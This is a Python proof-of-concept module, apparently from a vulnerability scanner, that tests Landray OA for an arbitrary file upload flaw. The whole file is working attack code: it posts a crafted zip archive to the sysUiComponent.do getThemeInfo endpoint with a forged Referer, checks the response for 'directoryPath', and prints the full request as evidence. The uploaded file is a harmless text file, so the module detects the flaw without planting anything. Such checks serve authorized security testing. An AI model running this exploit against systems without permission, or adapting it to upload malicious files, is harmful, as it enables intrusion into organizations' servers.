'''
Function:
    蓝凌oa 任意文件上传
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Accept-Encoding": "gzip, deflate",
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo".format(scheme, netloc)
        data = {
            "file": ("test.zip", b"PK\x03\x04\x14\x00\x00\x00\x00\x00\xcc\\yW\xd2cH\x88\x03\x00\x00\x00\x03\x00\x00\x00\x07\x00\x00\x00123.txt123PK\x03\x04\x14\x00\x00\x00\x00\x00\x05\xb3yWs\x17\xa5\xec\x15\x00\x00\x00\x15\x00\x00\x00\r\x00\x00\x00component.iniid=2023\r\nname=123.txtPK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xcc\\yW\xd2cH\x88\x03\x00\x00\x00\x03\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x00\x00\x00\x00123.txtPK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\x05\xb3yWs\x17\xa5\xec\x15\x00\x00\x00\x15\x00\x00\x00\r\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00(\x00\x00\x00component.iniPK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00p\x00\x00\x00h\x00\x00\x00\x00\x00", "application/zip")
        }
        self.headers["Referer"] = "{}://{}/sys/ui/sys_ui_component/sysUiComponent.do?method=upload".format(scheme, netloc)
        try:
            result = requests.post(url=url, files=data, headers=self.headers, allow_redirects=False, verify=False, timeout=3, proxies=self.proxies)
            if result.status_code == 200 and "directoryPath" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body
                new_data = ""
                for i in range(len(bodys)):
                    try:
                        if bodys[i] == 13:
                            new_data += "\\r"
                        elif bodys[i] == 10:
                            new_data += "\\n"
                        else:
                            new_data += chr(bodys[i])
                    except:
                        new_data += hex(bodys[i]).replace('0x', '\\\\x')
                new_data = new_data.split("\\r\\n")
                for body in new_data:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except Exception as e:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False


